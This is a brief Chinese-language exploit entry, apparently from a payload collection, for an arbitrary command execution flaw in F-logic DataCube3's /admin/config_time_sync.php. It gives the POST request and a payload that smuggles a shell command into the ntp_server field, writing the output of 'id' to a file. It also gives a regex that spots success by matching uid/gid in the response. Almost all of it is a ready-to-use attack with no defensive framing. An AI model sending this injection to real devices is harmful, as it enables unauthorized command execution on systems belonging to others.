# F-logicDataCube3config_time_sync.php任意命令执行漏洞

F-logicDataCube3config_time_sync.php ｜ 命令执行 ｜ —
- **请求**：`POST /admin/config_time_sync.php HTTP/1.1`

**Payload**
```
accesstime=0.85628800 1710984011&execute=&ntp_enable=&ntp_server=127.0.0.1id >dudesite.txt&
```
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$